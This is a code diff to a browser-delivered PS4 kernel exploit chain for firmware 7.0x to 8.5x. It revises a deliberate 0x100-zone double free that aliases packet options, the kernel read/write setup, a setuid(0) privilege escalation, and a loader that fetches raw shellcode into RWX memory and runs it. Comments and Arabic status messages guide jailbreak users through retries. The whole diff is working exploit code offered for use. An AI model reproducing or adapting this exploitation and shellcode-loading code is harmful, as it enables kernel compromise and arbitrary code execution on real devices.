@@ -45,6 +45,13 @@ import * as fw_ps4_800 from "./lapse/800.js";
 import * as fw_ps4_850 from "./lapse/850.js";
 import * as fw_ps4_852 from "./lapse/852.js";
 
+// [H0sS F3] PS4 WebKit (7.0x-8.5x) ships without Number.isInteger; a call
+// to it throws TypeError and kills the whole chain on console. Portable
+// equivalent used everywhere Number.isInteger used to be called.
+function isInteger(value) {
+  return typeof value === "number" && isFinite(value) && Math.floor(value) === value;
+}
+
 const t1 = performance.now();
 
 // check if we are running on a supported firmware version
@@ -992,40 +999,44 @@ function leak_kernel_addrs(sd_pair) {
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
 
+// [H0sS F1] single-attempt only (psfree_lapse v2.3 technique): this stage
+// runs INSIDE the panic window opened by aio_multi_delete()'s deliberate
+// 0x100-zone double free. Each extra free/alloc cycle rolls the dice on a
+// corrupted malloc zone, and an alias that slips past the marker check gets
+// double-freed on the next pass -> kernel panic. One pass, then die() and
+// let the entry point guide the user to reload the page.
 function make_aliased_pktopts(sds) {
   const tclass = new Word();
-  for (let loop = 0; loop < num_alias; loop++) {
-    for (let i = 0; i < num_sds; i++) {
-      setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-    }
+  for (let i = 0; i < num_sds; i++) {
+    setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+  }
 
-    for (let i = 0; i < num_sds; i++) {
-      tclass[0] = i;
-      ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-    }
+  for (let i = 0; i < num_sds; i++) {
+    tclass[0] = i;
+    ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+  }
 
-    for (let i = 0; i < sds.length; i++) {
-      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-      const marker = tclass[0];
-      if (marker !== i) {
-        log(`aliased pktopts at attempt: ${loop}`);
-        const pair = [sds[i], sds[marker]];
-        log(`found pair: ${pair}`);
-        sds.splice(marker, 1);
-        sds.splice(i, 1);
-        // add pktopts to the new sockets now while new allocs can't
-        // use the double freed memory
-        for (let i = 0; i < 2; i++) {
-          const sd = new_socket();
-          ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
-          sds.push(sd);
-        }
-
-        return pair;
+  for (let i = 0; i < sds.length; i++) {
+    gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+    const marker = tclass[0];
+    if (marker !== i) {
+      log(`aliased pktopts`);
+      const pair = [sds[i], sds[marker]];
+      log(`found pair: ${pair}`);
+      sds.splice(marker, 1);
+      sds.splice(i, 1);
+      // add pktopts to the new sockets now while new allocs can't
+      // use the double freed memory
+      for (let i = 0; i < 2; i++) {
+        const sd = new_socket();
+        ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+        sds.push(sd);
       }
+
+      return pair;
     }
   }
-  die("failed to make aliased pktopts");
+  die("failed to make aliased pktopts (single-attempt policy)");
 }
 
 function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
@@ -1398,7 +1409,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
 
     _verify_len(len) {
-      if (!(Number.isInteger(len) && 0 <= len <= 0xffffffff)) {
+      if (!(isInteger(len) && 0 <= len <= 0xffffffff)) {
         throw TypeError("len not a 32-bit unsigned integer");
       }
     }
@@ -1644,8 +1655,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   log('setuid(0)');
   sysi('setuid', 0);
   log('kernel exploit succeeded!');
-  localStorage.ExploitLoaded="yes";
-  sessionStorage.ExploitLoaded="yes";
+  // [H0sS F2] storage flags removed -- PS4 WebKit storage is unreliable
+  // after kernel R/W. The already-loaded state is re-derived on every
+  // page load via the setuid(0) probe in kexploit() below.
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1688,25 +1700,44 @@ function setup(block_fd) {
 // * corrupt a pipe for arbitrary r/w
 //
 // the exploit implementation also assumes that we are pinned to one core
+let kexploit_started = false;
+
 export async function kexploit() {
+  // [H0sS F6] init guard: the chain must run at most once per page
+  // instance -- a second entry re-frees the same kernel objects and
+  // panics the console.
+  if (kexploit_started) {
+    return new Promise(() => {});
+  }
+  kexploit_started = true;
   const _init_t1 = performance.now();
   await init();
   const _init_t2 = performance.now();
 
+  // [H0sS F2] probe-based already-loaded detection (replaces localStorage
+  // flags, which are unreliable on PS4 WebKit after kernel R/W): setuid(0)
+  // only succeeds when the kernel is already patched -- GoldHEN or a
+  // previous kexploit is resident -- so it is authoritative for every
+  // scenario: fresh boot, page reload, or new browser session.
+  let already_rooted = false;
   try {
     chain.sys('setuid', 0);
+    already_rooted = true;
   } catch (e) {
-    localStorage.ExploitLoaded = "no";
+    already_rooted = false;
   }
 
   // H0sS: ?bin=<path> overrides the payload (PKG-BackUP tool launcher).
   // Never skip the payload when an override is requested -- the whole point
   // of the override is to deliver a tool payload, even if a previous session
   // already loaded GoldHEN. (OVR_BIN is defined at module scope below.)
-  if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded != "yes" && !OVR_BIN) {
+  if (already_rooted && !OVR_BIN) {
     msgs.innerHTML = "GoldHEN is Already Loaded ...";
     return new Promise(() => {});
   }
+  // already_rooted && OVR_BIN: the kernel is patched, so the chain-based
+  // payload loader works without re-running the kernel exploit -- we
+  // return normally and the entry point below delivers the tool payload.
 
   const current_core = get_current_core();
   const current_rtprio = get_current_rtprio();
@@ -1810,61 +1841,63 @@ function array_from_address(addr, size) {
   return og_array;
 }
 
+// [H0sS F4+F6] fetch-based payload loader with pre-flight validation.
+// The old XHR mapped whatever arrived straight into RWX memory; a silent
+// network error left the user with a false "Loaded ..." message. Payloads
+// on this host are raw shellcode blobs starting with 0xE9 (GoldHEN and
+// PKG-BackUP alike) -- anything else is truncated/corrupt and must NOT run.
 function runPayload(path) {
-  // Why xhr instead of fetch? More universal support, more control, better errors, etc.
   log(`loading ${path}`);
-  const xhr = new XMLHttpRequest();
-  xhr.open("GET", path);
-  xhr.responseType = "arraybuffer";
-  xhr.onreadystatechange = function () {
-    // When request is "DONE"
-    if (xhr.readyState === 4) {
-      // If response code is "OK"
-      if (xhr.status === 200) {
-        try {
-          // Allocate a buffer with length rounded up to the next multiple of 4 bytes for Uint32 alignment
-          const padding_length = (4 - (xhr.response.byteLength % 4)) % 4;
-          const padded_buffer = new Uint8Array(xhr.response.byteLength + padding_length);
-
-          // Load xhr response data into the payload buffer and pad the rest with zeros
-          padded_buffer.set(new Uint8Array(xhr.response), 0);
-          if (padding_length) {
-            padded_buffer.set(new Uint8Array(padding_length), xhr.response.byteLength);
-          }
-
-          // Convert padded_buffer to Uint32Array. That's what `array_from_address()` expects
-          const shellcode = new Uint32Array(padded_buffer.buffer);
-
-          // Map memory with RWX permissions to load the payload into
-          const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
-          log(`payload buffer allocated at ${payload_buffer}`);
-
-          // Create an JS array that "shadows" the mapped location
-          const payload_buffer_shadow = array_from_address(payload_buffer, shellcode.length);
-
-          // Move the shellcode to the array created in the previous step
-          payload_buffer_shadow.set(shellcode);
-          log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding_length} bytes padding)`);
-
-          // Call the payload
-          chain.call_void(payload_buffer);
-
-          // Unmap the memory used for the payload
-          sysi("munmap", payload_buffer, padded_buffer.length);
-        } catch (e) {
-          // Caught error while trying to execute payload
-          log(`error in runPayload: ${e.message}`);
-        }
-      } else {
-        // Some other HTTP response code (eg. 404)
-        log(`error retrieving payload, ${xhr.status}`);
-      }
+  fetch(path).then(function (response) {
+    if (!response.ok) {
+      throw Error(`error retrieving payload, HTTP ${response.status}`);
     }
-  };
-  xhr.onerror = function () {
-    log("network error");
-  };
-  xhr.send();
+    return response.arrayBuffer();
+  }).then(function (response) {
+    try {
+      const payload_bytes = new Uint8Array(response);
+      if (payload_bytes.length < 0x40 || payload_bytes[0] !== 0xe9) {
+        throw Error(`payload file corrupted (len=${payload_bytes.length}, magic=0x${(payload_bytes[0] || 0).toString(16)})`);
+      }
+      // Allocate a buffer with length rounded up to the next multiple of 4 bytes for Uint32 alignment
+      const padding_length = (4 - (response.byteLength % 4)) % 4;
+      const padded_buffer = new Uint8Array(response.byteLength + padding_length);
+
+      // Load response data into the payload buffer and pad the rest with zeros
+      padded_buffer.set(payload_bytes, 0);
+      if (padding_length) {
+        padded_buffer.set(new Uint8Array(padding_length), response.byteLength);
+      }
+
+      // Convert padded_buffer to Uint32Array. That's what `array_from_address()` expects
+      const shellcode = new Uint32Array(padded_buffer.buffer);
+
+      // Map memory with RWX permissions to load the payload into
+      const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
+      log(`payload buffer allocated at ${payload_buffer}`);
+
+      // Create an JS array that "shadows" the mapped location
+      const payload_buffer_shadow = array_from_address(payload_buffer, shellcode.length);
+
+      // Move the shellcode to the array created in the previous step
+      payload_buffer_shadow.set(shellcode);
+      log(`loaded ${response.byteLength} bytes for payload (+ ${padding_length} bytes padding)`);
+
+      // Call the payload
+      chain.call_void(payload_buffer);
+
+      // Unmap the memory used for the payload
+      sysi("munmap", payload_buffer, padded_buffer.length);
+    } catch (e) {
+      // Caught error while trying to execute payload
+      log(`error in runPayload: ${e.message}`);
+    }
+  }).catch(function (e) {
+    // [H0sS F6] unified, actionable error for the payload stage
+    msgs.innerHTML = 'فشل تحميل ملف البيلود — اعمل تحديث للصفحة (F5) وجرّب تاني، ولو استمر الفشل اقفل المتصفح وافتحه من جديد';
+    msgs.style.color = 'yellow';
+    log(`payload fetch failed: ${e && e.message ? e.message : e}`);
+  });
 }
 
 // H0sS: module-scope payload override (?bin=) used by the PKG-BackUP launcher
@@ -1879,6 +1912,9 @@ kexploit().then(() => {
                         : "GoldHEN v2.4b18.10 Loaded ...";
         },500);
 }).catch(() => {
-    msgs.innerHTML = "Failed to Load! Restart Your Console ...";
+    // [H0sS F6] unified failure guidance: after a failed kernel-heap stage
+    // the heap is untrusted -- reload the page for a fresh attempt; if it
+    // keeps failing, reboot the console for a clean kernel state.
+    msgs.innerHTML = 'فشل تحميل الجيلبريك — حدّث الصفحة (F5) وأعد المحاولة، ولو استمر الفشل اعمل ريستارت للجهاز';
     msgs.style.color = "yellow";
 });
